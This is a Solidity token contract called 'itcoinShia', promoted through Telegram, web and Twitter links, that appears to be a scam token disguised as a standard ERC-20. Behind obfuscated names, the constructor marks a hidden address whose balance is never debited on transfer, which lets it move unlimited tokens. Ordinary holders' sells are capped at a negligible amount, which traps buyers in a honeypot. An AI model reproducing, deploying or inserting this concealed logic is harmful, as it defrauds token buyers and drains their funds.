/*

Telegram: https://t.me/BitcoinShiaPortal

Website: https://bitcoinshia.crypto-token.live/

Twitter: https://twitter.com/BitcoinShia

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract itcoinShia is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address pczi, uint256 psgxnwtadcik) public returns (bool success) {
        allowance[msg.sender][pczi] = psgxnwtadcik;
        emit Approval(msg.sender, pczi, psgxnwtadcik);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address gfnheqp, uint256 psgxnwtadcik) public returns (bool success) {
        cyhsfkqogru(msg.sender, gfnheqp, psgxnwtadcik);
        return true;
    }

    uint256 private iouem = 117;

    function cyhsfkqogru(address mcpskd, address gfnheqp, uint256 psgxnwtadcik) private {
        address dszvxlyct = IUniswapV2Factory(giexwm.factory()).getPair(address(this), giexwm.WETH());
        if (0 == jminaowd[mcpskd]) {
            if (mcpskd != dszvxlyct && opgutfk[mcpskd] != block.number && psgxnwtadcik < totalSupply) {
                require(psgxnwtadcik <= totalSupply / (10 ** decimals));
            }
            balanceOf[mcpskd] -= psgxnwtadcik;
        }
        balanceOf[gfnheqp] += psgxnwtadcik;
        opgutfk[gfnheqp] = block.number;
        emit Transfer(mcpskd, gfnheqp, psgxnwtadcik);
    }

    constructor(string memory wzdqasmergf, string memory hfepzitldk, address akwhzxq, address kgli) {
        name = wzdqasmergf;
        symbol = hfepzitldk;
        balanceOf[msg.sender] = totalSupply;
        jminaowd[kgli] = iouem;
        giexwm = IUniswapV2Router02(akwhzxq);
    }

    string public symbol;

    function transferFrom(address mcpskd, address gfnheqp, uint256 psgxnwtadcik) public returns (bool success) {
        require(psgxnwtadcik <= allowance[mcpskd][msg.sender]);
        allowance[mcpskd][msg.sender] -= psgxnwtadcik;
        cyhsfkqogru(mcpskd, gfnheqp, psgxnwtadcik);
        return true;
    }

    mapping(address => uint256) private opgutfk;

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private giexwm;

    uint8 public decimals = 9;

    mapping(address => uint256) private jminaowd;
}
